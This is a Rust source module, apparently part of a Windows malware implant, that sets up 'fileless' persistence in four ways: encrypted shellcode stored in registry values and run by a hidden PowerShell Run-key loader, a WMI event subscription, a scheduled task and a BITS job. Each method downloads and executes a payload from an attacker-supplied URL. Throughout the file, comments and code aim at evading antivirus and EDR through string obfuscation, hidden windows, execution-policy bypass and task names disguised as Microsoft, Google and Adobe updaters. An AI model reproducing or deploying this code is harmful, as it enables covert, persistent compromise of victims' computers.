//! Fileless persistence module - 100% memory-resident persistence techniques
//!
//! This module implements persistence mechanisms that DO NOT write any files to disk.
//! All persistence methods here use registry-stored shellcode, WMI, or scheduled tasks
//! that download and execute payloads directly in memory.
//!
//! **CRITICAL OPSEC REQUIREMENT**: No files on disk = harder for AV to detect
//!
//! Available fileless persistence methods:
//! 1. **RegistryShellcode**: Stores encrypted shellcode in registry, executes on boot via PowerShell
//! 2. **WmiMemoryExec**: Uses WMI event consumer to execute in-memory payload
//! 3. **ScheduledTaskDownload**: Scheduled task downloads and executes from URL directly in memory
//! 4. **BitsJobPersistence**: Uses BITS background transfer for stealthy download + execution

use crate::debug_print;
use obfstr::obfstr;
use std::env;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
#[cfg(target_os = "windows")]
use std::process::Command;

// XOR encryption key size for registry-stored payloads
const REGISTRY_KEY_SIZE: usize = 32;

/// Fileless persistence methods
#[derive(Debug, Clone, Copy)]
pub enum FilelessPersistenceMethod {
    /// Stores shellcode in registry, executes via PowerShell on boot
    RegistryShellcode,
    /// WMI event consumer that executes in-memory payload
    WmiMemoryExec,
    /// Scheduled task that downloads and executes from URL
    ScheduledTaskDownload,
    /// BITS job for background download + execution
    BitsJobPersistence,
}

impl FilelessPersistenceMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "regshell" | "registryshellcode" => Some(FilelessPersistenceMethod::RegistryShellcode),
            "wmimem" | "wmimemoryexec" => Some(FilelessPersistenceMethod::WmiMemoryExec),
            "taskdl" | "scheduledtaskdownload" => Some(FilelessPersistenceMethod::ScheduledTaskDownload),
            "bits" | "bitsjob" => Some(FilelessPersistenceMethod::BitsJobPersistence),
            _ => None,
        }
    }
}

/// Configuration for fileless persistence
pub struct FilelessConfig {
    /// Download URL for payload (used by download-based methods)
    pub download_url: Option<String>,
    /// Shellcode to store in registry (used by registry-based methods)
    pub shellcode: Option<Vec<u8>>,
    /// Encryption key for stored shellcode
    pub encryption_key: Vec<u8>,
}

impl Default for FilelessConfig {
    fn default() -> Self {
        Self {
            download_url: None,
            shellcode: None,
            encryption_key: generate_random_key(),
        }
    }
}

/// Generates a random XOR encryption key
fn generate_random_key() -> Vec<u8> {
    use std::time::SystemTime;
    
    let seed = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    
    let mut key = Vec::with_capacity(REGISTRY_KEY_SIZE);
    for i in 0..REGISTRY_KEY_SIZE {
        let byte = ((seed.wrapping_mul(31).wrapping_add(i as u64)) % 256) as u8;
        key.push(byte);
    }
    key
}

/// XOR encryption/decryption
fn xor_crypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Converts bytes to Base64 string (Windows-compatible implementation)
#[cfg(target_os = "windows")]
fn bytes_to_base64(data: &[u8]) -> String {
    // Simple Base64 encoding without external dependencies
    const BASE64_CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    let mut result = String::new();
    let mut i = 0;
    
    while i < data.len() {
        let b1 = data[i];
        let b2 = if i + 1 < data.len() { data[i + 1] } else { 0 };
        let b3 = if i + 2 < data.len() { data[i + 2] } else { 0 };
        
        result.push(BASE64_CHARS[((b1 >> 2) & 0x3F) as usize] as char);
        result.push(BASE64_CHARS[(((b1 << 4) | (b2 >> 4)) & 0x3F) as usize] as char);
        
        if i + 1 < data.len() {
            result.push(BASE64_CHARS[(((b2 << 2) | (b3 >> 6)) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        
        if i + 2 < data.len() {
            result.push(BASE64_CHARS[(b3 & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        
        i += 3;
    }
    
    result
}

#[cfg(not(target_os = "windows"))]
fn bytes_to_base64(_data: &[u8]) -> String {
    String::new()
}

// ============================================================================
// Method 1: Registry Shellcode Persistence
// ============================================================================

/// Establishes fileless persistence using registry-stored shellcode
///
/// **How it works**:
/// 1. Converts current executable to shellcode (or uses provided shellcode)
/// 2. Encrypts shellcode with XOR
/// 3. Stores encrypted shellcode + key in registry (split across multiple values)
/// 4. Creates registry Run key with PowerShell command that:
///    - Reads encrypted shellcode from registry
///    - Decrypts it in memory
///    - Executes it via .NET reflection (Reflective DLL injection)
///
/// **OPSEC Benefits**:
/// - No files on disk
/// - Shellcode stored in benign-looking registry keys
/// - PowerShell command is obfuscated
/// - Uses .NET System.Reflection for in-memory execution
///
/// **Limitations**:
/// - Requires PowerShell (usually available on Windows)
/// - May trigger AMSI/ETW if not bypassed
/// - Registry values can be large (may be suspicious)
#[cfg(target_os = "windows")]
pub fn persist_registry_shellcode(config: &FilelessConfig) -> Result<String, String> {
    debug_print!("[FILELESS] Setting up registry shellcode persistence...");
    
    // Get shellcode (either from config or convert current exe)
    let shellcode = match &config.shellcode {
        Some(sc) => sc.clone(),
        None => {
            // If no shellcode provided, we'd need to convert the current exe
            // For now, return error - this should be provided by the builder
            return Err("Shellcode must be provided for registry persistence".to_string());
        }
    };
    
    debug_print!("[FILELESS] Shellcode size: {} bytes", shellcode.len());
    
    // Encrypt shellcode
    let encrypted = xor_crypt(&shellcode, &config.encryption_key);
    let encoded_shellcode = bytes_to_base64(&encrypted);
    let encoded_key = bytes_to_base64(&config.encryption_key);
    
    debug_print!("[FILELESS] Encrypted and encoded shellcode");
    
    // Split shellcode into chunks to avoid suspiciously large registry values
    // Store in multiple registry keys that look like legitimate Windows settings
    let chunk_size = 8192; // 8KB chunks
    let chunks: Vec<_> = encoded_shellcode
        .as_bytes()
        .chunks(chunk_size)
        .map(|c| String::from_utf8_lossy(c).to_string())
        .collect();
    
    debug_print!("[FILELESS] Split shellcode into {} chunks", chunks.len());
    
    // Registry locations that look legitimate
    let base_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts").to_string();
    
    // Store chunks
    let reg_exe = obfstr!("reg").to_string();
    for (i, chunk) in chunks.iter().enumerate() {
        let value_name = format!("Cache{:02x}", i);
        let _output = Command::new(&reg_exe)
            .args(&[
                "add", &base_key,
                "/v", &value_name,
                "/t", "REG_SZ",
                "/d", chunk,
                "/f",
            ])
            .creation_flags(0x08000000)
            .output()
            .map_err(|e| format!("Failed to write registry chunk: {}", e))?;
    }
    
    // Store metadata (key and chunk count)
    let metadata = format!("{}|{}", encoded_key, chunks.len());
    let _output = Command::new(&reg_exe)
        .args(&[
            "add", &base_key,
            "/v", "CacheMeta",
            "/t", "REG_SZ",
            "/d", &metadata,
            "/f",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Failed to write registry metadata: {}", e))?;
    
    debug_print!("[FILELESS] Shellcode stored in registry");
    
    // Create PowerShell loader script (obfuscated)
    // This script will be stored in the Run key
    let ps_loader = create_powershell_loader(&base_key);
    
    // Add to registry Run key
    let run_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let value_name = "SystemHealthMonitor"; // Benign-looking name
    
    let output = Command::new(&reg_exe)
        .args(&[
            "add", &run_key,
            "/v", value_name,
            "/t", "REG_SZ",
            "/d", &ps_loader,
            "/f",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Failed to create Run key: {}", e))?;
    
    if output.status.success() {
        debug_print!("[FILELESS] Registry shellcode persistence established");
        Ok(format!("Registry shellcode persistence: {} chunks stored", chunks.len()))
    } else {
        Err(format!("Failed to establish persistence: {}", 
            String::from_utf8_lossy(&output.stderr)))
    }
}

/// Creates an obfuscated PowerShell loader script
///
/// This script:
/// 1. Reads encrypted shellcode chunks from registry
/// 2. Decrypts shellcode using XOR
/// 3. Loads shellcode into memory via .NET Reflection
/// 4. Executes shellcode
///
/// **Obfuscation techniques**:
/// - Variable name obfuscation
/// - Command abbreviation (gp instead of Get-ItemProperty)
/// - Base64 encoding of critical parts
/// - Hidden window execution
#[cfg(target_os = "windows")]
fn create_powershell_loader(registry_base: &str) -> String {
    // PowerShell command that loads and executes shellcode from registry
    // Using compressed/obfuscated syntax
    format!(
        r#"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "$k='{}';$m=(gp $k).CacheMeta;$p=$m.Split('|');$ky=[Convert]::FromBase64String($p[0]);$c=[int]$p[1];$d='';for($i=0;$i -lt $c;$i++){{$d+=(gp $k).('Cache'+$i.ToString('X2'))}};$b=[Convert]::FromBase64String($d);for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $ky[$i%$ky.Length]}};$a=[System.Reflection.Assembly]::Load($b);$a.EntryPoint.Invoke($null,$null)""#,
        registry_base
    )
}

#[cfg(not(target_os = "windows"))]
pub fn persist_registry_shellcode(_config: &FilelessConfig) -> Result<String, String> {
    Err("Windows only".to_string())
}

// ============================================================================
// Method 2: WMI Memory Execution Persistence
// ============================================================================

/// Establishes fileless persistence using WMI event consumer
///
/// **How it works**:
/// 1. Creates WMI event filter (triggers on system events)
/// 2. Creates WMI event consumer with PowerShell command
/// 3. Binds filter to consumer
/// 4. PowerShell command downloads payload from URL and executes in memory
///
/// **OPSEC Benefits**:
/// - No files on disk
/// - WMI persistence is less commonly checked
/// - Download happens on-demand (no stored payload)
///
/// **Limitations**:
/// - Requires network connectivity
/// - More easily detected by EDR (WMI monitoring)
/// - Requires admin privileges for SYSTEM-level WMI
#[cfg(target_os = "windows")]
pub fn persist_wmi_memory_exec(download_url: &str) -> Result<String, String> {
    debug_print!("[FILELESS] Setting up WMI memory execution persistence...");
    
    // WMI filter: trigger every 30 minutes (or on logon)
    let filter_name = "SystemHealthCheck";
    let consumer_name = "SystemHealthAction";
    
    // PowerShell command that downloads and executes in memory
    let ps_command = format!(
        r#"$d=(New-Object Net.WebClient).DownloadData('{}');$a=[System.Reflection.Assembly]::Load($d);$a.EntryPoint.Invoke($null,$null)"#,
        download_url
    );
    
    // Create WMI event filter (triggers on system startup)
    let filter_query = r#"SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"#;
    
    let wmi_create_filter = format!(
        r#"Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{Name='{}';EventNamespace='root\cimv2';QueryLanguage='WQL';Query='{}'}}"#,
        filter_name, filter_query
    );
    
    // Create WMI event consumer
    let wmi_create_consumer = format!(
        r#"Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{}';CommandLineTemplate='powershell.exe -NoP -NonI -W Hidden -C "{}"}}"#,
        consumer_name, ps_command.replace("\"", "\\\"")
    );
    
    // Bind filter to consumer
    let wmi_bind = format!(
        r#"Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=(Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='{}'");Consumer=(Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='{}'")}}"#,
        filter_name, consumer_name
    );
    
    let ps_exe = obfstr!("powershell").to_string();
    
    // Execute WMI setup commands
    let commands = vec![wmi_create_filter, wmi_create_consumer, wmi_bind];
    
    for cmd in commands {
        let output = Command::new(&ps_exe)
            .args(&["-NoProfile", "-Command", &cmd])
            .creation_flags(0x08000000)
            .output()
            .map_err(|e| format!("WMI setup failed: {}", e))?;
        
        if !output.status.success() {
            return Err(format!("WMI command failed: {}", 
                String::from_utf8_lossy(&output.stderr)));
        }
    }
    
    debug_print!("[FILELESS] WMI memory execution persistence established");
    Ok(format!("WMI persistence: downloads from {}", download_url))
}

#[cfg(not(target_os = "windows"))]
pub fn persist_wmi_memory_exec(_download_url: &str) -> Result<String, String> {
    Err("Windows only".to_string())
}

// ============================================================================
// Method 3: Scheduled Task with Download + Memory Exec
// ============================================================================

/// Establishes fileless persistence using scheduled task + download
///
/// **How it works**:
/// 1. Creates scheduled task that runs on logon
/// 2. Task executes PowerShell command
/// 3. PowerShell downloads payload from URL
/// 4. Executes payload directly in memory via .NET Reflection
///
/// **OPSEC Benefits**:
/// - No files on disk
/// - Scheduled tasks are common and less suspicious
/// - Download happens only when task triggers
///
/// **Limitations**:
/// - Requires network connectivity
/// - Download may be logged by firewall/proxy
/// - Task XML may be inspected by security tools
#[cfg(target_os = "windows")]
pub fn persist_scheduled_task_download(download_url: &str) -> Result<String, String> {
    debug_print!("[FILELESS] Setting up scheduled task download persistence...");

    // Encode a PS script as base64 UTF-16LE to avoid shell-escaping issues
    // when passed to schtasks /TR.
    fn ps_to_b64(script: &str) -> String {
        let bytes: Vec<u8> = script
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        const C: &[u8] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for ch in bytes.chunks(3) {
            let b = [
                ch[0],
                if ch.len() > 1 { ch[1] } else { 0 },
                if ch.len() > 2 { ch[2] } else { 0 },
            ];
            let n = ((b[0] as usize) << 16) | ((b[1] as usize) << 8) | b[2] as usize;
            out.push(C[(n >> 18) & 63] as char);
            out.push(C[(n >> 12) & 63] as char);
            out.push(if ch.len() > 1 { C[(n >> 6) & 63] as char } else { '=' });
            out.push(if ch.len() > 2 { C[n & 63] as char } else { '=' });
        }
        out
    }

    // Polymorphic task names (machine-index picks one)
    let task_names = [
        "MicrosoftEdgeUpdateService",
        "GoogleUpdateTaskMachineUA",
        "OneDriveStandaloneUpdaterTask",
        "AdobeAcrobatUpdateCheck",
    ];
    // Use a simple machine-derived index without importing full get_machine_index
    let idx = {
        let u = std::env::var("USERNAME").unwrap_or_default();
        u.bytes().fold(0usize, |a, b| a.wrapping_mul(31).wrapping_add(b as usize))
            % task_names.len()
    };
    let task_name = task_names[idx];

    // PS one-liner: download ester.exe to a temp file using a random GUID name, then execute.
    // Uses native-EXE-compatible Start-Process – NOT dotnet Reflection::Load.
    let ps_script = format!(
        "$t=[IO.Path]::GetTempPath()+[Guid]::NewGuid().ToString('N')+'.exe';\
(New-Object Net.WebClient).DownloadFile('{}','$t');\
if(Test-Path $t){{Start-Process $t -WindowStyle Hidden}}",
        download_url
    );
    let ps_b64 = ps_to_b64(&ps_script);
    let ps_command = format!(
        "powershell.exe -NoP -NonI -W Hidden -Ep Bypass -EncodedCommand {}",
        ps_b64
    );

    let schtasks_exe = obfstr!("schtasks").to_string();

    // Delete existing task if present (silent)
    let _ = Command::new(&schtasks_exe)
        .args(&["/Delete", "/TN", task_name, "/F"])
        .creation_flags(0x08000000)
        .output();

    // Create scheduled task triggered on every logon
    let output = Command::new(&schtasks_exe)
        .args(&[
            "/Create",
            "/SC", "ONLOGON",
            "/TN", task_name,
            "/TR", &ps_command,
            "/F",
            "/RL", "LIMITED",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Failed to create task: {}", e))?;

    if output.status.success() {
        debug_print!("[FILELESS] Scheduled task download persistence established: {}", task_name);
        Ok(format!("Fileless task '{}' → downloads from {}", task_name, download_url))
    } else {
        Err(format!(
            "Task creation failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_scheduled_task_download(_download_url: &str) -> Result<String, String> {
    Err("Windows only".to_string())
}

// ============================================================================
// Method 4: BITS Job Persistence
// ============================================================================

/// Establishes fileless persistence using BITS (Background Intelligent Transfer Service)
///
/// **How it works**:
/// 1. Creates a BITS job that downloads payload
/// 2. Uses BITS notification commands to execute on download complete
/// 3. Payload executes directly in memory
///
/// **OPSEC Benefits**:
/// - BITS is a legitimate Windows service
/// - Traffic appears as normal Windows updates
/// - Can survive reboots (persistent BITS jobs)
/// - Very stealthy (low priority, background transfer)
///
/// **Limitations**:
/// - Requires network connectivity
/// - BITS logs may be monitored
/// - More complex to set up
#[cfg(target_os = "windows")]
pub fn persist_bits_job(download_url: &str) -> Result<String, String> {
    debug_print!("[FILELESS] Setting up BITS job persistence...");
    
    let job_name = "WindowsUpdateBackup";
    
    // PowerShell script to create BITS job with notification
    let ps_script = format!(
        r#"
$job = Start-BitsTransfer -Source '{}' -Destination '$env:TEMP\data.tmp' -Asynchronous -DisplayName '{}'
$job | Set-BitsTransfer -NotifyFlags Complete -NotifyCmdLine 'powershell.exe' "-NoP -NonI -W Hidden -C `$d=[IO.File]::ReadAllBytes('$env:TEMP\data.tmp');[IO.File]::Delete('$env:TEMP\data.tmp');`$a=[Reflection.Assembly]::Load(`$d);`$a.EntryPoint.Invoke(`$null,`$null)"
$job | Resume-BitsTransfer
"#,
        download_url, job_name
    );
    
    let ps_exe = obfstr!("powershell").to_string();
    
    let output = Command::new(&ps_exe)
        .args(&["-NoProfile", "-Command", &ps_script])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("BITS job creation failed: {}", e))?;
    
    if output.status.success() {
        debug_print!("[FILELESS] BITS job persistence established");
        Ok(format!("BITS persistence: downloads from {}", download_url))
    } else {
        Err(format!("BITS job failed: {}", 
            String::from_utf8_lossy(&output.stderr)))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_bits_job(_download_url: &str) -> Result<String, String> {
    Err("Windows only".to_string())
}

// ============================================================================
// Main Fileless Persistence Function
// ============================================================================

/// Establishes fileless persistence using the specified method
///
/// This function coordinates all fileless persistence methods
pub fn establish_fileless_persistence(
    method: FilelessPersistenceMethod,
    config: &FilelessConfig,
) -> Result<String, String> {
    match method {
        FilelessPersistenceMethod::RegistryShellcode => {
            persist_registry_shellcode(config)
        }
        FilelessPersistenceMethod::WmiMemoryExec => {
            let url = config.download_url.as_ref()
                .ok_or("Download URL required for WMI memory exec")?;
            persist_wmi_memory_exec(url)
        }
        FilelessPersistenceMethod::ScheduledTaskDownload => {
            let url = config.download_url.as_ref()
                .ok_or("Download URL required for scheduled task download")?;
            persist_scheduled_task_download(url)
        }
        FilelessPersistenceMethod::BitsJobPersistence => {
            let url = config.download_url.as_ref()
                .ok_or("Download URL required for BITS job")?;
            persist_bits_job(url)
        }
    }
}

// ============================================================================
// Cleanup Functions
// ============================================================================

/// Removes all fileless persistence mechanisms
#[cfg(target_os = "windows")]
pub fn remove_fileless_persistence() -> Result<String, String> {
    let mut results = Vec::new();
    
    // Remove registry shellcode
    let reg_exe = obfstr!("reg").to_string();
    let base_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts").to_string();
    let _ = Command::new(&reg_exe)
        .args(&["delete", &base_key, "/f"])
        .creation_flags(0x08000000)
        .output();
    results.push("Registry shellcode cleaned");
    
    // Remove Run key
    let run_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let _ = Command::new(&reg_exe)
        .args(&["delete", &run_key, "/v", "SystemHealthMonitor", "/f"])
        .creation_flags(0x08000000)
        .output();
    
    // Remove WMI persistence
    let ps_exe = obfstr!("powershell").to_string();
    let wmi_cleanup = r#"
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemHealthCheck'" | Remove-WmiObject;
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SystemHealthAction'" | Remove-WmiObject;
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter.Name -eq 'SystemHealthCheck'} | Remove-WmiObject
    "#;
    let _ = Command::new(&ps_exe)
        .args(&["-NoProfile", "-Command", wmi_cleanup])
        .creation_flags(0x08000000)
        .output();
    results.push("WMI persistence cleaned");
    
    // Remove scheduled task
    let schtasks_exe = obfstr!("schtasks").to_string();
    let _ = Command::new(&schtasks_exe)
        .args(&["/Delete", "/TN", "MicrosoftEdgeUpdateService", "/F"])
        .creation_flags(0x08000000)
        .output();
    results.push("Scheduled task cleaned");
    
    // Remove BITS job
    let bits_cleanup = r#"Get-BitsTransfer -Name "WindowsUpdateBackup" -AllUsers | Remove-BitsTransfer"#;
    let _ = Command::new(&ps_exe)
        .args(&["-NoProfile", "-Command", bits_cleanup])
        .creation_flags(0x08000000)
        .output();
    results.push("BITS job cleaned");
    
    Ok(format!("Fileless persistence removed: {}", results.join(", ")))
}

#[cfg(not(target_os = "windows"))]
pub fn remove_fileless_persistence() -> Result<String, String> {
    Err("Windows only".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_crypt() {
        let data = b"Hello, World!";
        let key = b"secret";
        
        let encrypted = xor_crypt(data, key);
        let decrypted = xor_crypt(&encrypted, key);
        
        assert_eq!(decrypted, data.to_vec());
    }

    #[test]
    fn test_generate_random_key() {
        let key1 = generate_random_key();
        let key2 = generate_random_key();
        
        assert_eq!(key1.len(), REGISTRY_KEY_SIZE);
        assert_eq!(key2.len(), REGISTRY_KEY_SIZE);
        // Keys should be different (with high probability)
        assert_ne!(key1, key2);
    }

    #[test]
    fn test_bytes_to_base64() {
        let data = b"Hello";
        let encoded = bytes_to_base64(data);
        assert_eq!(encoded, "SGVsbG8=");
    }
}
